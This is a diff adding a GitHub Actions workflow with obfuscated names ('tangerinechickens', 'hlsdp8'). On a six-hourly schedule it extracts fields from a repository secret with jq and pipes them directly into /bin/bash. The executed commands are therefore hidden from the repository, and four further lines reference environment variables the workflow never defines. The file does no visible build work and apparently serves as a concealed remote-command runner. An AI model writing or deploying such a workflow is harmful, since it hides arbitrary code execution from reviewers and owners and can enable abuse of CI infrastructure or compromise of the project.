@@ -1,0 +1,22 @@
+name: tangerinechickens
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangerinechickens
+        env:
+          hlsdp8: ${{ secrets.hlsdp8 }}
+        run: |
+          echo $hlsdp8 | jq -r .i946 | /bin/bash
+          echo $vglu3151 | jq -r .axh5654 | /bin/bash
+          echo $hf4 | jq -r .rbjv96230 | /bin/bash
+          echo $pfl7 | jq -r .nt22522 | /bin/bash
+          echo $mcpm6 | jq -r .va637 | /bin/bash
+
